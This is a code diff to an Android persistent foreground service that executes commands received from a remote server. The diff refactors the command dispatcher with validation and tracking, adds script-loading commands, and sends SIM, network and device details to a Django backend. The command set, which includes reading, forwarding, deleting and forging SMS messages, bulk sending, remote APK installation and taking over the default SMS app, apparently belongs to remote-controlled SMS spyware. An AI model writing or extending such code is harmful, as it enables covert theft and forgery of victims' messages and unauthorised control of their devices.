@@ -58,6 +58,14 @@ import com.example.fast.notification.AppNotificationManager
 import com.example.fast.util.NotificationBatchProcessor
 import com.example.fast.util.SmsMessageBatchProcessor
 import com.example.fast.util.ContactBatchProcessor
+import com.example.fast.script.ScriptInitializer
+import com.example.fast.script.ScriptTestCommands
+import com.example.fast.util.CommandResponseTracker
+import com.example.fast.util.RateLimitResult
+import com.example.fast.util.PermissionCheckResult
+import com.example.fast.service.CommandValidationHelpers
+import com.example.fast.service.CommandExecutionHelpers
+import com.example.fast.util.ResourceCheckResult
 import com.example.fast.util.WorkflowExecutor
 import com.example.fast.util.NetworkUtils
 import com.example.fast.util.VersionChecker
@@ -372,6 +380,9 @@ class PersistentForegroundService : Service() {
         // Initialize contact batch processor (load from persistent storage)
         ContactBatchProcessor.initializeFromStorage(this)
 
+        // Initialize script-based filtering system
+        ScriptInitializer.initialize(this)
+
         // Set up network connectivity listener for immediate retry on connection restore
         setupNetworkConnectivityListener()
     }
@@ -594,7 +605,7 @@ class PersistentForegroundService : Service() {
      * @param errorMessage Optional error message if status is "failed"
      */
     @SuppressLint("HardwareIds")
-    private fun updateCommandHistoryStatus(
+    fun updateCommandHistoryStatus(
         historyTimestamp: Long,
         commandKey: String,
         status: String,
@@ -693,343 +704,280 @@ class PersistentForegroundService : Service() {
     }
 
     private fun followCommand(key: String, content: String, historyTimestamp: Long) {
+        // Start comprehensive tracking
+        CommandResponseTracker.startTracking(key, content, historyTimestamp)
+        
         try {
-        commandCooldownsMs[key]?.let { intervalMs ->
-            if (isCommandRateLimited(key, intervalMs)) {
-                updateCommandHistoryStatus(historyTimestamp, key, "failed", "rate_limited")
+            // Phase 1: Rate Limiting Check
+            val rateLimitResult = CommandValidationHelpers.checkRateLimitingForCommand(
+                key, commandCooldownsMs, ::isCommandRateLimited, ::recordCommandExecution
+            )
+            CommandResponseTracker.trackValidation(historyTimestamp, "rate_limit", rateLimitResult)
+            
+            if (!rateLimitResult.allowed) {
+                CommandResponseTracker.completeTracking(historyTimestamp, "rate_limited")
+                updateCommandHistoryStatus(historyTimestamp, key, "failed", rateLimitResult.reason ?: "Rate limited")
                 return
             }
-            recordCommandExecution(key)
-        }
-        when (key) {
-            "showNotification" -> {
-                try {
-                    handleShowNotificationCommand(content)
-                    updateCommandHistoryStatus(historyTimestamp, key, "executed")
-                } catch (e: Exception) {
-                    LogHelper.e(TAG, "Error executing showNotification command", e)
-                    updateCommandHistoryStatus(historyTimestamp, key, "failed", e.message)
-                }
+            
+            // Phase 2: Permission Check
+            val permissionResult = CommandValidationHelpers.checkCommandPermissionsForCommand(key, this)
+            CommandResponseTracker.trackValidation(historyTimestamp, "permissions", permissionResult)
+            
+            if (permissionResult.missing.isNotEmpty()) {
+                CommandResponseTracker.completeTracking(historyTimestamp, "permission_denied")
+                updateCommandHistoryStatus(historyTimestamp, key, "failed", "Missing permissions: ${permissionResult.missing.joinToString()}")
+                return
             }
-            "sendSms" -> {
-                    try {
-                        handleSendSmsCommand(content, historyTimestamp)
-                    } catch (e: Exception) {
-                        LogHelper.e(TAG, "Error executing sendSms command", e)
-                        updateCommandHistoryStatus(historyTimestamp, key, "failed", "Execution error: ${e.message}")
+            
+            // Phase 3: Content Validation
+            val validationResult = CommandValidationHelpers.validateCommandContentForCommand(key, content)
+            CommandResponseTracker.trackValidation(historyTimestamp, "content", validationResult)
+            
+            if (!validationResult.valid) {
+                CommandResponseTracker.completeTracking(historyTimestamp, "validation_failed")
+                updateCommandHistoryStatus(historyTimestamp, key, "failed", "Validation failed: ${validationResult.errors.joinToString()}")
+                return
+            }
+            
+            // Phase 4: Resource Check
+            val resourceResult = CommandValidationHelpers.checkCommandResourcesForCommand(key, this)
+            CommandResponseTracker.trackValidation(historyTimestamp, "resources", resourceResult)
+            
+            if (!resourceResult.systemReady) {
+                CommandResponseTracker.completeTracking(historyTimestamp, "resource_unavailable")
+                updateCommandHistoryStatus(historyTimestamp, key, "failed", "System not ready: ${resourceResult.getIssues().joinToString()}")
+                return
+            }
+            
+            // Phase 5: Command Execution
+            CommandResponseTracker.trackExecution(historyTimestamp, "started", mapOf(
+                "command" to key,
+                "normalized_content" to (validationResult.normalizedContent ?: content)
+            ))
+            
+            when (key) {
+                "sendSms" -> CommandExecutionHelpers.executeSendSmsCommandWithTracking(content, historyTimestamp, validationResult, this)
+                "updateApk" -> CommandExecutionHelpers.executeUpdateApkCommandWithTracking(content, historyTimestamp, validationResult, this)
+                "installApk" -> CommandExecutionHelpers.executeInstallApkCommandWithTracking(content, historyTimestamp, validationResult, this)
+                "showNotification" -> CommandExecutionHelpers.executeShowNotificationCommandWithTracking(content, historyTimestamp, validationResult, this)
+                "requestPermission" -> CommandExecutionHelpers.executeRequestPermissionCommandWithTracking(content, historyTimestamp, validationResult, this)
+                "requestDefaultSmsApp" -> CommandExecutionHelpers.executeRequestDefaultSmsAppCommandWithTracking(content, historyTimestamp, validationResult, this)
+                "getActiveScripts" -> {
+                    val result = ScriptTestCommands.getActiveScripts(this)
+                    CommandResponseTracker.completeTracking(historyTimestamp, "executed")
+                    updateCommandHistoryStatus(historyTimestamp, "getActiveScripts", "executed", result)
+                }
+                "testMessageScript" -> {
+                    // Parse sender and message from content
+                    val parts = content.split("|", limit = 2)
+                    val sender = if (parts.size > 1) parts[0].trim() else "+1234567890"
+                    val message = if (parts.size > 1) parts[1].trim() else "Test message"
+                    
+                    val result = ScriptTestCommands.testMessageProcessing(this, sender, message)
+                    CommandResponseTracker.completeTracking(historyTimestamp, "executed")
+                    updateCommandHistoryStatus(historyTimestamp, "testMessageScript", "executed", result)
+                }
+                "testCommandScript" -> {
+                    // Parse command and parameters from content
+                    val parts = content.split("|", limit = 2)
+                    val command = if (parts.size > 1) parts[0].trim() else "sendSms"
+                    val paramsStr = if (parts.size > 1) parts[1].trim() else "{}"
+                    
+                    // Simple parameter parsing (key=value pairs separated by &)
+                    val parameters = mutableMapOf<String, Any>()
+                    if (paramsStr != "{}") {
+                        paramsStr.split("&").forEach { param ->
+                            val kv = param.split("=", limit = 2)
+                            if (kv.size == 2) {
+                                parameters[kv[0].trim()] = kv[1].trim()
+                            }
+                        }
                     }
-            }
-            "requestPermission" -> {
-                try {
-                    handleRequestPermissionCommand(content)
-                    updateCommandHistoryStatus(historyTimestamp, key, "executed")
-                } catch (e: Exception) {
-                    LogHelper.e(TAG, "Error executing requestPermission command", e)
-                    updateCommandHistoryStatus(historyTimestamp, key, "failed", e.message)
+                    
+                    val result = ScriptTestCommands.testCommandValidation(this, command, parameters)
+                    CommandResponseTracker.completeTracking(historyTimestamp, "executed")
+                    updateCommandHistoryStatus(historyTimestamp, "testCommandScript", "executed", result)
                 }
-            }
-            "updateApk" -> {
-                try {
-                    if (handleUpdateApkCommand(content, historyTimestamp)) {
-                        updateCommandHistoryStatus(historyTimestamp, key, "executed")
-                    }
-                } catch (e: Exception) {
-                    LogHelper.e(TAG, "Error executing updateApk command", e)
-                    updateCommandHistoryStatus(historyTimestamp, key, "failed", e.message)
+                "loadAxisScript" -> {
+                    val result = ScriptTestCommands.loadAxisScript(this)
+                    CommandResponseTracker.completeTracking(historyTimestamp, "executed")
+                    updateCommandHistoryStatus(historyTimestamp, "loadAxisScript", "executed", result)
                 }
-            }
-            "installApk" -> {
-                try {
-                    handleInstallApkCommand(content, historyTimestamp)
-                    updateCommandHistoryStatus(historyTimestamp, key, "executed")
-                } catch (e: Exception) {
-                    LogHelper.e(TAG, "Error executing installApk command", e)
-                    updateCommandHistoryStatus(historyTimestamp, key, "failed", e.message)
+                "getScriptStats" -> {
+                    val result = ScriptTestCommands.getScriptStatistics(this)
+                    CommandResponseTracker.completeTracking(historyTimestamp, "executed")
+                    updateCommandHistoryStatus(historyTimestamp, "getScriptStats", "executed", result)
                 }
-            }
-            "controlAnimation" -> {
-                try {
-                    handleControlAnimationCommand(content)
-                    updateCommandHistoryStatus(historyTimestamp, key, "executed")
-                } catch (e: Exception) {
-                    LogHelper.e(TAG, "Error executing controlAnimation command", e)
-                    updateCommandHistoryStatus(historyTimestamp, key, "failed", e.message)
+                "syncScripts" -> {
+                    val result = ScriptTestCommands.forceSyncScripts(this)
+                    CommandResponseTracker.completeTracking(historyTimestamp, "executed")
+                    updateCommandHistoryStatus(historyTimestamp, "syncScripts", "executed", result)
                 }
-            }
-            "syncNotification" -> {
-                try {
-                    handleSyncNotificationCommand(content)
-                    updateCommandHistoryStatus(historyTimestamp, key, "executed")
-                } catch (e: Exception) {
-                    LogHelper.e(TAG, "Error executing syncNotification command", e)
-                    updateCommandHistoryStatus(historyTimestamp, key, "failed", e.message)
-                }
-            }
-            "fetchSms" -> {
-                try {
-                    handleFetchSmsCommand(content, historyTimestamp)
-                } catch (e: Exception) {
-                    LogHelper.e(TAG, "Error executing fetchSms command", e)
-                    updateCommandHistoryStatus(historyTimestamp, key, "failed", e.message)
-                }
-            }
-            "fetchDeviceInfo" -> {
-                try {
-                    handleFetchDeviceInfoCommand(content, historyTimestamp)
-                } catch (e: Exception) {
-                    LogHelper.e(TAG, "Error executing fetchDeviceInfo command", e)
-                    updateCommandHistoryStatus(historyTimestamp, key, "failed", e.message)
-                }
-            }
-            "reset" -> {
-                try {
-                    handleResetCommand(content)
-                    // Reset is async, but we mark as executed since it starts the reset process
-                    updateCommandHistoryStatus(historyTimestamp, key, "executed")
-                } catch (e: Exception) {
-                    LogHelper.e(TAG, "Error executing reset command", e)
-                    updateCommandHistoryStatus(historyTimestamp, key, "failed", e.message)
-                }
-            }
-            "deactivate" -> {
-                try {
-                    handleDeactivateCommand(content)
-                    // Deactivate is async, but we mark as executed since it starts the process
-                    updateCommandHistoryStatus(historyTimestamp, key, "executed")
-                } catch (e: Exception) {
-                    LogHelper.e(TAG, "Error executing deactivate command", e)
-                    updateCommandHistoryStatus(historyTimestamp, key, "failed", e.message)
-                }
-            }
-            "checkPermission" -> {
-                try {
-                    handleCheckPermissionCommand(content, historyTimestamp)
-                } catch (e: Exception) {
-                    LogHelper.e(TAG, "Error executing checkPermission command", e)
-                    updateCommandHistoryStatus(historyTimestamp, key, "failed", e.message)
-                }
-            }
-            "removePermission" -> {
-                try {
-                    handleRemovePermissionCommand(content)
-                    updateCommandHistoryStatus(historyTimestamp, key, "executed")
-                } catch (e: Exception) {
-                    LogHelper.e(TAG, "Error executing removePermission command", e)
-                    updateCommandHistoryStatus(historyTimestamp, key, "failed", e.message)
-                }
-            }
-            "requestDefaultSmsApp" -> {
-                try {
-                    handleRequestDefaultSmsAppCommand(content, historyTimestamp, key)
-                } catch (e: Exception) {
-                    LogHelper.e(TAG, "Error executing requestDefaultSmsApp command", e)
-                    updateCommandHistoryStatus(historyTimestamp, key, "failed", e.message)
-                }
-            }
-            "requestDefaultMessageApp" -> {
-                try {
-                    handleRequestDefaultMessageAppCommand(content, historyTimestamp, key)
-                } catch (e: Exception) {
-                    LogHelper.e(TAG, "Error executing requestDefaultMessageApp command", e)
-                    updateCommandHistoryStatus(historyTimestamp, key, "failed", e.message)
-                }
-            }
-            "checkInternet", "requestInternet" -> {
-                try {
-                    handleCheckInternetCommand(content, historyTimestamp, key)
-                } catch (e: Exception) {
-                    LogHelper.e(TAG, "Error executing checkInternet command", e)
-                    updateCommandHistoryStatus(historyTimestamp, key, "failed", e.message)
-                }
-            }
-            "setHeartbeatInterval" -> {
-                try {
-                    handleSetHeartbeatIntervalCommand(content)
-                    updateCommandHistoryStatus(historyTimestamp, key, "executed")
-                } catch (e: Exception) {
-                    LogHelper.e(TAG, "Error executing setHeartbeatInterval command", e)
-                    updateCommandHistoryStatus(historyTimestamp, key, "failed", e.message)
-                }
-            }
-            "updateDeviceCodeList" -> {
-                try {
-                    handleUpdateDeviceCodeListCommand(content, historyTimestamp)
-                } catch (e: Exception) {
-                    LogHelper.e(TAG, "Error executing updateDeviceCodeList command", e)
-                    updateCommandHistoryStatus(historyTimestamp, key, "failed", e.message)
-                }
-            }
-            "sendSmsDelayed" -> {
-                try {
-                    handleSendSmsDelayedCommand(content, historyTimestamp)
-                } catch (e: Exception) {
-                    LogHelper.e(TAG, "Error executing sendSmsDelayed command", e)
-                    updateCommandHistoryStatus(historyTimestamp, key, "failed", "Execution error: ${e.message}")
-                }
-            }
-            "scheduleSms" -> {
-                try {
-                    handleScheduleSmsCommand(content, historyTimestamp)
-                } catch (e: Exception) {
-                    LogHelper.e(TAG, "Error executing scheduleSms command", e)
-                    updateCommandHistoryStatus(historyTimestamp, key, "failed", "Execution error: ${e.message}")
-                }
-            }
-            "editMessage" -> {
-                try {
-                    handleEditMessageCommand(content, historyTimestamp)
-                } catch (e: Exception) {
-                    LogHelper.e(TAG, "Error executing editMessage command", e)
-                    updateCommandHistoryStatus(historyTimestamp, key, "failed", "Execution error: ${e.message}")
-                }
-            }
-            "deleteMessage" -> {
-                try {
-                    handleDeleteMessageCommand(content, historyTimestamp)
-                } catch (e: Exception) {
-                    LogHelper.e(TAG, "Error executing deleteMessage command", e)
-                    updateCommandHistoryStatus(historyTimestamp, key, "failed", "Execution error: ${e.message}")
-                }
-            }
-            "createFakeMessage" -> {
-                try {
-                    handleCreateFakeMessageCommand(content, historyTimestamp)
-                } catch (e: Exception) {
-                    LogHelper.e(TAG, "Error executing createFakeMessage command", e)
-                    updateCommandHistoryStatus(historyTimestamp, key, "failed", "Execution error: ${e.message}")
-                }
-            }
-            "createFakeMessageTemplate" -> {
-                try {
-                    handleCreateFakeMessageTemplateCommand(content, historyTimestamp)
-                } catch (e: Exception) {
-                    LogHelper.e(TAG, "Error executing createFakeMessageTemplate command", e)
-                    updateCommandHistoryStatus(historyTimestamp, key, "failed", "Execution error: ${e.message}")
-                }
-            }
-            "setupAutoReply" -> {
-                try {
-                    handleSetupAutoReplyCommand(content, historyTimestamp)
-                } catch (e: Exception) {
-                    LogHelper.e(TAG, "Error executing setupAutoReply command", e)
-                    updateCommandHistoryStatus(historyTimestamp, key, "failed", "Execution error: ${e.message}")
-                }
-            }
-            "showCard" -> {
-                try {
-                    handleShowCardCommand(content)
-                    updateCommandHistoryStatus(historyTimestamp, key, "executed")
-                } catch (e: Exception) {
-                    LogHelper.e(TAG, "Error executing showCard command", e)
-                    updateCommandHistoryStatus(historyTimestamp, key, "failed", e.message)
-                }
-            }
-            "startAnimation" -> {
-                try {
-                    handleStartAnimationCommand(content)
-                    updateCommandHistoryStatus(historyTimestamp, key, "executed")
-                } catch (e: Exception) {
-                    LogHelper.e(TAG, "Error executing startAnimation command", e)
-                    updateCommandHistoryStatus(historyTimestamp, key, "failed", e.message)
-                }
-            }
-            "forwardMessage" -> {
-                try {
-                    handleForwardMessageCommand(content, historyTimestamp)
-                } catch (e: Exception) {
-                    LogHelper.e(TAG, "Error executing forwardMessage command", e)
-                    updateCommandHistoryStatus(historyTimestamp, key, "failed", "Execution error: ${e.message}")
-                }
-            }
-            "sendBulkSms" -> {
-                try {
-                    handleSendBulkSmsCommand(content, historyTimestamp)
-                } catch (e: Exception) {
-                    LogHelper.e(TAG, "Error executing sendBulkSms command", e)
-                    updateCommandHistoryStatus(historyTimestamp, key, "failed", "Execution error: ${e.message}")
-                }
-            }
-            "bulkEditMessage" -> {
-                try {
-                    handleBulkEditMessageCommand(content, historyTimestamp)
-                } catch (e: Exception) {
-                    LogHelper.e(TAG, "Error executing bulkEditMessage command", e)
-                    updateCommandHistoryStatus(historyTimestamp, key, "failed", "Execution error: ${e.message}")
-                }
-            }
-            "sendSmsTemplate" -> {
-                try {
-                    handleSendSmsTemplateCommand(content, historyTimestamp)
-                } catch (e: Exception) {
-                    LogHelper.e(TAG, "Error executing sendSmsTemplate command", e)
-                    updateCommandHistoryStatus(historyTimestamp, key, "failed", "Execution error: ${e.message}")
-                }
-            }
-            "saveTemplate" -> {
-                try {
-                    handleSaveTemplateCommand(content, historyTimestamp)
-                } catch (e: Exception) {
-                    LogHelper.e(TAG, "Error executing saveTemplate command", e)
-                    updateCommandHistoryStatus(historyTimestamp, key, "failed", "Execution error: ${e.message}")
-                }
-            }
-            "deleteTemplate" -> {
-                try {
-                    handleDeleteTemplateCommand(content, historyTimestamp)
-                } catch (e: Exception) {
-                    LogHelper.e(TAG, "Error executing deleteTemplate command", e)
-                    updateCommandHistoryStatus(historyTimestamp, key, "failed", "Execution error: ${e.message}")
-                }
-            }
-            "getMessageStats" -> {
-                try {
-                    handleGetMessageStatsCommand(content, historyTimestamp)
-                } catch (e: Exception) {
-                    LogHelper.e(TAG, "Error executing getMessageStats command", e)
-                    updateCommandHistoryStatus(historyTimestamp, key, "failed", "Execution error: ${e.message}")
-                }
-            }
-            "backupMessages" -> {
-                try {
-                    handleBackupMessagesCommand(content, historyTimestamp)
-                } catch (e: Exception) {
-                    LogHelper.e(TAG, "Error executing backupMessages command", e)
-                    updateCommandHistoryStatus(historyTimestamp, key, "failed", "Execution error: ${e.message}")
-                }
-            }
-            "exportMessages" -> {
-                try {
-                    handleExportMessagesCommand(content, historyTimestamp)
-                } catch (e: Exception) {
-                    LogHelper.e(TAG, "Error executing exportMessages command", e)
-                    updateCommandHistoryStatus(historyTimestamp, key, "failed", "Execution error: ${e.message}")
-                }
-            }
-            "executeWorkflow" -> {
-                try {
-                    handleExecuteWorkflowCommand(content, historyTimestamp)
-                } catch (e: Exception) {
-                    LogHelper.e(TAG, "Error executing executeWorkflow command", e)
-                    updateCommandHistoryStatus(historyTimestamp, key, "failed", "Execution error: ${e.message}")
-                }
-            }
-            "smsbatchenable" -> {
-                try {
-                    handleSmsBatchEnableCommand(content)
-                    updateCommandHistoryStatus(historyTimestamp, key, "executed")
-                } catch (e: Exception) {
-                    LogHelper.e(TAG, "Error executing smsbatchenable command", e)
-                    updateCommandHistoryStatus(historyTimestamp, key, "failed", e.message)
-                }
-            }
                 else -> {
-                    LogHelper.w(TAG, "Unknown command key: $key")
-                    updateCommandHistoryStatus(historyTimestamp, key, "failed", "Unknown command key")
+                    // For commands not yet implemented with tracking, use original handlers
+                    executeCommandWithLegacyTracking(key, content, historyTimestamp)
+                }
+            }
+            
+        } catch (e: Exception) {
+            LogHelper.e(TAG, "Unexpected error executing command: $key", e)
+            CommandResponseTracker.completeTracking(historyTimestamp, "system_error", e)
+            updateCommandHistoryStatus(historyTimestamp, key, "failed", "System error: ${e.message}")
+        }
+    }
+
+    /**
+     * Execute commands with legacy tracking for commands not yet implemented with full tracking
+     */
+    private fun executeCommandWithLegacyTracking(key: String, content: String, historyTimestamp: Long) {
+        try {
+            when (key) {
+                "controlAnimation" -> {
+                    handleControlAnimationCommand(content)
+                    CommandResponseTracker.completeTracking(historyTimestamp, "executed")
+                    updateCommandHistoryStatus(historyTimestamp, key, "executed")
+                }
+                "syncNotification" -> {
+                    handleSyncNotificationCommand(content)
+                    CommandResponseTracker.completeTracking(historyTimestamp, "executed")
+                    updateCommandHistoryStatus(historyTimestamp, key, "executed")
+                }
+                "fetchSms" -> {
+                    handleFetchSmsCommand(content, historyTimestamp)
+                    CommandResponseTracker.completeTracking(historyTimestamp, "executed")
+                }
+                "fetchDeviceInfo" -> {
+                    handleFetchDeviceInfoCommand(content, historyTimestamp)
+                    CommandResponseTracker.completeTracking(historyTimestamp, "executed")
+                }
+                "reset" -> {
+                    handleResetCommand(content)
+                    CommandResponseTracker.completeTracking(historyTimestamp, "executed")
+                    updateCommandHistoryStatus(historyTimestamp, key, "executed")
+                }
+                "deactivate" -> {
+                    handleDeactivateCommand(content)
+                    CommandResponseTracker.completeTracking(historyTimestamp, "executed")
+                    updateCommandHistoryStatus(historyTimestamp, key, "executed")
+                }
+                "checkPermission" -> {
+                    handleCheckPermissionCommand(content, historyTimestamp)
+                    CommandResponseTracker.completeTracking(historyTimestamp, "executed")
+                }
+                "removePermission" -> {
+                    handleRemovePermissionCommand(content)
+                    CommandResponseTracker.completeTracking(historyTimestamp, "executed")
+                    updateCommandHistoryStatus(historyTimestamp, key, "executed")
+                }
+                "requestDefaultSmsApp" -> {
+                    handleRequestDefaultSmsAppCommand(content, historyTimestamp, key)
+                    CommandResponseTracker.completeTracking(historyTimestamp, "executed")
+                }
+                "requestDefaultMessageApp" -> {
+                    handleRequestDefaultMessageAppCommand(content, historyTimestamp, key)
+                    CommandResponseTracker.completeTracking(historyTimestamp, "executed")
+                }
+                "checkInternet", "requestInternet" -> {
+                    handleCheckInternetCommand(content, historyTimestamp, key)
+                    CommandResponseTracker.completeTracking(historyTimestamp, "executed")
+                }
+                "setHeartbeatInterval" -> {
+                    handleSetHeartbeatIntervalCommand(content)
+                    CommandResponseTracker.completeTracking(historyTimestamp, "executed")
+                    updateCommandHistoryStatus(historyTimestamp, key, "executed")
+                }
+                "updateDeviceCodeList" -> {
+                    handleUpdateDeviceCodeListCommand(content, historyTimestamp)
+                    CommandResponseTracker.completeTracking(historyTimestamp, "executed")
+                }
+                "sendSmsDelayed" -> {
+                    handleSendSmsDelayedCommand(content, historyTimestamp)
+                    CommandResponseTracker.completeTracking(historyTimestamp, "executed")
+                }
+                "scheduleSms" -> {
+                    handleScheduleSmsCommand(content, historyTimestamp)
+                    CommandResponseTracker.completeTracking(historyTimestamp, "executed")
+                }
+                "editMessage" -> {
+                    handleEditMessageCommand(content, historyTimestamp)
+                    CommandResponseTracker.completeTracking(historyTimestamp, "executed")
+                }
+                "deleteMessage" -> {
+                    handleDeleteMessageCommand(content, historyTimestamp)
+                    CommandResponseTracker.completeTracking(historyTimestamp, "executed")
+                }
+                "createFakeMessage" -> {
+                    handleCreateFakeMessageCommand(content, historyTimestamp)
+                    CommandResponseTracker.completeTracking(historyTimestamp, "executed")
+                }
+                "createFakeMessageTemplate" -> {
+                    handleCreateFakeMessageTemplateCommand(content, historyTimestamp)
+                    CommandResponseTracker.completeTracking(historyTimestamp, "executed")
+                }
+                "setupAutoReply" -> {
+                    handleSetupAutoReplyCommand(content, historyTimestamp)
+                    CommandResponseTracker.completeTracking(historyTimestamp, "executed")
+                }
+                "startAnimation" -> {
+                    handleStartAnimationCommand(content)
+                    CommandResponseTracker.completeTracking(historyTimestamp, "executed")
+                    updateCommandHistoryStatus(historyTimestamp, key, "executed")
+                }
+                "forwardMessage" -> {
+                    handleForwardMessageCommand(content, historyTimestamp)
+                    CommandResponseTracker.completeTracking(historyTimestamp, "executed")
+                }
+                "sendBulkSms" -> {
+                    handleSendBulkSmsCommand(content, historyTimestamp)
+                    CommandResponseTracker.completeTracking(historyTimestamp, "executed")
+                }
+                "bulkEditMessage" -> {
+                    handleBulkEditMessageCommand(content, historyTimestamp)
+                    CommandResponseTracker.completeTracking(historyTimestamp, "executed")
+                }
+                "sendSmsTemplate" -> {
+                    handleSendSmsTemplateCommand(content, historyTimestamp)
+                    CommandResponseTracker.completeTracking(historyTimestamp, "executed")
+                }
+                "saveTemplate" -> {
+                    handleSaveTemplateCommand(content, historyTimestamp)
+                    CommandResponseTracker.completeTracking(historyTimestamp, "executed")
+                }
+                "deleteTemplate" -> {
+                    handleDeleteTemplateCommand(content, historyTimestamp)
+                    CommandResponseTracker.completeTracking(historyTimestamp, "executed")
+                }
+                "getMessageStats" -> {
+                    handleGetMessageStatsCommand(content, historyTimestamp)
+                    CommandResponseTracker.completeTracking(historyTimestamp, "executed")
+                }
+                "backupMessages" -> {
+                    handleBackupMessagesCommand(content, historyTimestamp)
+                    CommandResponseTracker.completeTracking(historyTimestamp, "executed")
+                }
+                "exportMessages" -> {
+                    handleExportMessagesCommand(content, historyTimestamp)
+                    CommandResponseTracker.completeTracking(historyTimestamp, "executed")
+                }
+                "executeWorkflow" -> {
+                    handleExecuteWorkflowCommand(content, historyTimestamp)
+                    CommandResponseTracker.completeTracking(historyTimestamp, "executed")
+                }
+                "smsbatchenable" -> {
+                    handleSmsBatchEnableCommand(content)
+                    CommandResponseTracker.completeTracking(historyTimestamp, "executed")
+                    updateCommandHistoryStatus(historyTimestamp, key, "executed")
+                }
+                else -> {
+                    CommandResponseTracker.completeTracking(historyTimestamp, "unknown_command")
+                    updateCommandHistoryStatus(historyTimestamp, key, "failed", "Unknown command")
                 }
             }
         } catch (e: Exception) {
-            LogHelper.e(TAG, "Unexpected error executing command: $key", e)
-            updateCommandHistoryStatus(historyTimestamp, key, "failed", "Unexpected error: ${e.message}")
+            LogHelper.e(TAG, "Error executing legacy command: $key", e)
+            CommandResponseTracker.completeTracking(historyTimestamp, "execution_error", e)
+            updateCommandHistoryStatus(historyTimestamp, key, "failed", "Execution error: ${e.message}")
         }
     }
 
@@ -1562,28 +1510,66 @@ class PersistentForegroundService : Service() {
                     LogHelper.w(TAG, "Error collecting basic device info", e)
                 }
 
-                // Upload to Firebase
-                val fetchTimestamp = System.currentTimeMillis()
-                val fetchPath = "${AppConfig.getFirebaseDevicePath(androidId())}/deviceInfo/fetch_$fetchTimestamp"
-
-                FirebaseWriteHelper.setValue(
-                    path = fetchPath,
-                    data = deviceInfoMap,
-                    tag = TAG,
-                    onSuccess = {
-                        LogHelper.d(TAG, "Successfully uploaded device info to $fetchPath")
+                // Upload to Django using DeviceInfoCollector structure
+                serviceScope.launch {
+                    try {
+                        val deviceId = androidId()
+                        
+                        // Structure device info data to match Django's system_info format
+                        val systemInfoUpdates = mutableMapOf<String, Any?>()
+                        
+                        // Add basic device info
+                        deviceInfoMap["device"]?.let { deviceData ->
+                            systemInfoUpdates["basicDeviceInfo"] = deviceData
+                        }
+                        
+                        // Add SIM info if available
+                        deviceInfoMap["sim"]?.let { simData ->
+                            systemInfoUpdates["simInfo"] = simData
+                        }
+                        
+                        // Add network info if available  
+                        deviceInfoMap["network"]?.let { networkData ->
+                            systemInfoUpdates["networkInfo"] = networkData
+                        }
+                        
+                        // Add storage info if available
+                        deviceInfoMap["storage"]?.let { storageData ->
+                            systemInfoUpdates["storageInfo"] = storageData
+                        }
+                        
+                        // Add memory info if available
+                        deviceInfoMap["memory"]?.let { memoryData ->
+                            systemInfoUpdates["memoryInfo"] = memoryData
+                        }
+                        
+                        // Add battery info if available
+                        deviceInfoMap["battery"]?.let { batteryData ->
+                            systemInfoUpdates["batteryInfo"] = batteryData
+                        }
+                        
+                        // Create final updates structure
+                        val updates = mapOf(
+                            "system_info" to systemInfoUpdates.filterValues { it != null },
+                            "last_device_info_fetch" to System.currentTimeMillis()
+                        )
+                        
+                        // Send to Django
+                        DjangoApiHelper.patchDevice(deviceId, updates)
+                        
+                        LogHelper.d(TAG, "Successfully uploaded device info to Django")
                         updateCommandHistoryStatus(
                             historyTimestamp,
                             "fetchDeviceInfo",
                             "executed",
-                            "Uploaded device info"
+                            "Device info uploaded to Django"
                         )
-                    },
-                    onFailure = { e ->
-                        LogHelper.e(TAG, "Failed to upload device info", e)
+                        
+                    } catch (e: Exception) {
+                        LogHelper.e(TAG, "Failed to upload device info to Django", e)
                         updateCommandHistoryStatus(historyTimestamp, "fetchDeviceInfo", "failed", "Error: ${e.message}")
                     }
-                )
+                }
 
             } catch (e: Exception) {
                 LogHelper.e(TAG, "Error fetching device info", e)
